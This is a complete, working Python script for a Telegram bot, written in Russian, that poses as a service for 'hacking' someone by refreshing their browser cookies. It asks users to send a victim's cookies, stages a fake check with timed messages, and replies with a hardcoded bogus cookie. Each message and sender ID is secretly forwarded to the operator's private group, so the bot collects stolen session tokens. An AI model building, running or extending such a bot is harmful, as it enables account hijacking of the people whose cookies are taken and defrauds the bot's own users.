import os
import telebot
import time

print("🔧 Загрузка переменных окружения...")
TOKEN = os.getenv('BOT_TOKEN')
GROUP_ID = os.getenv('GROUP_ID')

if not TOKEN:
    print("❌ ОШИБКА: BOT_TOKEN не найден!")
    exit(1)
    
print(f"✅ Токен загружен: {TOKEN[:10]}...")
print(f"✅ ID группы: {GROUP_ID}")

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    print(f"👤 Получена команда /start от {message.from_user.id}")
    bot.send_message(message.chat.id, "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪")
    
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
        print("✅ Уведомление отправлено в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    print(f"📩 Получено сообщение: {message.text}")
    
    bot.send_message(message.chat.id, "Проверка куки...")
    time.sleep(1)
    bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
    time.sleep(2)
    bot.send_message(message.chat.id, "Инициализация завершена✅ ваш куки: CAEaAhACIhsKBGR1aWQSEzcyMDQzMzI1MzI4NDQxMjM2OTEoAw.dcx_K7KltLsjLmtD5zvo9MYLoxTWS-bwssrHI-5q2lB...")
    
    try:
        bot.send_message(GROUP_ID, f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}")
        print("✅ Сообщение переслано в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True, timeout=60)
